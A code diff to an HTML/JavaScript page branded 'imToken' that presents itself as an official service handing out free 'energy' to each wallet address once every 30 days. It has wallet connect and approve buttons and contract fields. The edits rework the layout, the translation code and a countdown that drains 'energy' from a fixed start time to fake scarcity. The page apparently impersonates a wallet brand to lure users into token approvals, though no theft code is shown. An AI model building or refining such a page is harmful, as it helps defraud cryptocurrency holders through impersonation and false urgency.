@@ -260,12 +260,13 @@ body {
 </head>
 <body>
     <div class="container">      
-        <div class="lang-switch">
+      <div class="lang-switch" style="text-align: right !important;">
             <button id="langToggle" class="lang-toggle">
                 <i class="fa fa-globe"></i> 
             </button>
-        </div>      
-        <div class="header">   
+        </div>  
+        <div class="container">
+        <div class="header">
             <div>
                 <h1 id="headerTitle">imToken</h1>
                 <p class="desc" id="headerDesc">imToken官方专属服务，每个钱包地址每30天只可领取一次能量</p>
@@ -575,13 +576,31 @@ body {
     function updatePageLang() {
         const lang = langConfig[currentLang];
         // 遍历所有带id的文本元素
-        Object.keys(lang).forEach(key => {
-            const el = document.getElementById(key);
-            if (el) {
-                // 特殊处理包含HTML的文本
-                el.innerHTML = lang[key];
-            }
-        });
+        document.getElementById("headerTitle").innerHTML = lang.headerTitle;
+    document.getElementById("headerDesc").innerHTML = lang.headerDesc;
+    document.getElementById("userInfoDefault").innerHTML = lang.userInfoDefault;
+    document.getElementById("walletStatusTitle").innerHTML = lang.walletStatusTitle;
+    document.getElementById("disconnectedText").innerHTML = lang.disconnectedText;
+    document.getElementById("disconnectedTip1").innerHTML = lang.disconnectedTip1;
+    document.getElementById("disconnectedTip2").innerHTML = lang.disconnectedTip2;
+    document.getElementById("disconnectedTip3").innerHTML = lang.disconnectedTip3;
+    document.getElementById("disconnectedTip4").innerHTML = lang.disconnectedTip4;
+    document.getElementById("disconnectedTip5").innerHTML = lang.disconnectedTip5;
+    document.getElementById("connectedSuccess").innerHTML = lang.connectedSuccess;
+    document.getElementById("connectedAddress").innerHTML = lang.connectedAddress;
+    document.getElementById("connectedType").innerHTML = lang.connectedType;
+    document.getElementById("connectedAmount").innerHTML = lang.connectedAmount;
+    document.getElementById("connectedWarn").innerHTML = lang.connectedWarn;
+    document.getElementById("contractResourceTitle").innerHTML = lang.contractResourceTitle;
+    document.getElementById("contractAddrText").innerHTML = lang.contractAddrText;
+    document.getElementById("contractEnergyText").innerHTML = lang.contractEnergyText;
+    document.getElementById("contractNote").innerHTML = lang.contractNote;
+    document.getElementById("recordTypeTitle").innerHTML = lang.recordTypeTitle;
+    document.getElementById("recordAmountTitle").innerHTML = lang.recordAmountTitle;
+    document.getElementById("energyType").innerHTML = lang.energyType;
+    document.getElementById("transferQuota").innerHTML = lang.transferQuota;
+    document.getElementById("browserWarn1").innerHTML = lang.browserWarn1;
+    document.getElementById("browserWarn2").innerHTML = lang.browserWarn2;
         // 特殊处理按钮文本（避免覆盖id）
         connectBtn.textContent = lang.connectBtnText;
         approveBtn.textContent = lang.approveBtnText;
@@ -880,18 +899,20 @@ body {
      * 能量计算相关函数
      */
     function startPersistentEnergyCountdown() {
-        const savedState = loadEnergyStateFromStorage();
-        let currentEnergy = savedState ? savedState.currentEnergy : INIT_ENERGY - Math.floor((new Date().getTime() - DEPLOY_START_TIME)/1000)*ENERGY_DECREASE_PER_SEC;
+    // 强制按当前时间计算，不读取localStorage（保证跨设备同步）
+    let currentEnergy = INIT_ENERGY - Math.floor((new Date().getTime() - DEPLOY_START_TIME)/1000)*ENERGY_DECREASE_PER_SEC;
+    currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
+    updateEnergyDisplay(currentEnergy);
+    // 清除旧定时器，启动新定时器
+    if (energyTimer) clearInterval(energyTimer);
+    energyTimer = setInterval(() => {
+        currentEnergy -= ENERGY_DECREASE_PER_SEC;
         currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
         updateEnergyDisplay(currentEnergy);
-        if (energyTimer) clearInterval(energyTimer);
-        energyTimer = setInterval(() => {
-            currentEnergy -= ENERGY_DECREASE_PER_SEC;
-            currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
-            updateEnergyDisplay(currentEnergy);
-            saveEnergyStateToStorage(currentEnergy);
-        }, 1000);
-    }
+        // 只保存当前能量，不依赖localStorage的时间（避免跨设备不同步）
+        localStorage.setItem(STORAGE_KEY, JSON.stringify({ currentEnergy }));
+    }, 1000);
+}
     function loadEnergyStateFromStorage() {
         try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || null; } catch (e) { return null; }
     }
